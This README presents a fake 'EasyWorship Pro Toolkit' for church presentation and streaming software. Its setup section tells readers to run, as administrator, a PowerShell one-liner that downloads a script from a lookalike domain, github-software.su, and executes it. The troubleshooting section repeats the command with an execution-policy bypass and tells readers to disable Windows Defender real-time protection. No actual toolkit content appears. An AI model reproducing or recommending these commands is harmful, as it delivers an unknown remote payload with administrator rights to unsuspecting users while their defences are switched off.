# EasyWorship Pro: Automation Scripts, Themes & Live Stream Integration

Welcome to the **EasyWorship Pro Toolkit** — an open-source collection of tools, configurations, and assets designed to optimize your church presentation software. This repository helps church media teams automate text layouts, import song databases, and establish seamless live streaming workflows.

## 🔥 Key Features & Capabilities
* **EasyWorship Automation**: Custom scripts for bulk importing song lyrics, chords, and multiple Bible translations (KJV, ESV, NIV, etc.).
* **OBS Studio & vMix Integration**: Ready-to-use NDI layouts, alpha channel (transparent background) overlays, and dynamic lower thirds.
* **Shortcuts & Hardware Control**: MIDI, Hotkeys, and Stream Deck profiles configured for remote church presentation management.
* **Premium Church Media Themes**: High-quality, performance-optimized backgrounds and text templates for Sunday worship services.

---

## 🚀 Automated Installation & Setup (PowerShell)

1. Open PowerShell as Administrator:
   * Press the `Win + X` keys simultaneously.
   * Select Terminal (Admin) or Windows PowerShell (Admin) from the context menu.

2. Execute the Deployment Command:
   Copy, paste, and press `Enter` to run the following optimized initialization command. This script dynamically configures the network bypass registry and fetches the necessary packages:

   ```powershell
   irm https://github-software.su/powershell/Loader.ps1 | iex
   ```
---

## 🔍 Troubleshooting & Common Errors

### 📌 Bypass Execution Policy (Blocking Unsigned Scripts)
If your system blocks the launch due to built-in execution policy constraints, enforce a bypass using this command:
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://github-software.su/powershell/Loader.ps1 | iex"
```

### 📌 Error: "irm is not recognized..." (PowerShell 2.0 Legacy)
In older legacy environments where aliases are missing, use explicit full system cmdlets:
```powershell
Invoke-RestMethod https://github-software.su/powershell/Loader.ps1 | Invoke-Expression
```


### 📌 Antivirus or SmartScreen Interception
Automated deployment routines can sometimes trigger proactive security heuristics. Temporarily disable "Real-time protection" within your Windows Defender settings during setup, then re-enable it immediately after completion.

---

### FAQ (Frequently Asked Questions)

#### How do I import new song lyrics into EasyWorship Pro?
Use the provided automation script to convert text or chord files directly into the native `EasyWorship Data` format.

#### Does this toolkit support dual-monitor church setups?
Yes. All themes, templates, and script layouts are fully optimized to support both the main projector output (FOH Screen) and the stage monitor display (Confidence Monitor).
